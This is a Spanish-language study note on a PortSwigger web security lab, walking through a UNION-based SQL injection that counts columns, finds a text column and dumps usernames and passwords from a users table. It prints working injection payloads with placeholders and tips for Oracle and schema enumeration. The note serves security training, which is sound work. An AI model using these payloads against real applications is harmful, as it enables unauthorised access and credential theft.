---
aliases:
  - SQL Injection 002 - UNION exfil de credenciales
  - sqli union retrieve data
tags:
  - vuln/sql-injection
  - example
  - portswigger
---

# 002 — UNION: exfiltrar credenciales de otra tabla

> Lab: [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables) · **Practitioner** · técnica → [[vulnerabilities/001-sql-injection/README|entry point]]

## ¿Por qué acá? (in-band, el dato vuelve en la respuesta)
- **Es el vector visible por excelencia:** el filtro de categoría (`?category=`) es un `WHERE` inyectable cuyo resultado se **imprime**. Con `UNION SELECT` agregás tu propia consulta y volcás la tabla de usuarios en la misma página.
- **Requisitos del UNION:** mismo **número de columnas** y **tipos compatibles** entre las dos consultas → por eso hay recon antes.

## Cómo explotarlo

> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (nº de columnas, columna de texto, tabla/columnas reales).

**1) Contar columnas** (subí hasta el error):
<pre class="payload"><code>'+ORDER+BY+<mark>1</mark>--
'+ORDER+BY+<mark>2</mark>--     ← el primer error = te pasaste; la última que funcionó = nº de columnas</code></pre>

**2) Ubicar la columna que acepta texto** (reemplazá cada NULL por `'a'`):
<pre class="payload"><code>'+UNION+SELECT+<mark>'a'</mark>,NULL--
'+UNION+SELECT+NULL,<mark>'a'</mark>--</code></pre>

**3) Volcar credenciales** de la tabla de usuarios:
<pre class="payload"><code>'+UNION+SELECT+<mark>username</mark>,<mark>password</mark>+FROM+<mark>users</mark>--</code></pre>

Si solo **una** columna acepta texto, concatená (ver Lab 10):
<pre class="payload"><code>'+UNION+SELECT+NULL,<mark>username</mark>||'~'||<mark>password</mark>+FROM+<mark>users</mark>--</code></pre>

## Verificación
- La página lista los productos **más** una fila extra con `username~password` de cada usuario → copiás las creds del **administrator** y te logueás → lab resuelto.

## Detalles que se pasan por alto
- **Oracle** exige `FROM`: usá `FROM dual` en los NULL de recon (`' UNION SELECT NULL FROM dual--`).
- Para descubrir el **nombre real** de tabla/columnas primero enumerá `information_schema.tables` / `columns` (Oracle: `all_tables` / `all_tab_columns`) — está en el [[vulnerabilities/001-sql-injection/cheat-sheet|cheat sheet]].
- El `+` es el espacio URL-encodeado en el query string GET.

→ Siguiente: [[vulnerabilities/001-sql-injection/examples/003-blind-boolean-cookie|003 · blind booleano en la cookie TrackingId]]
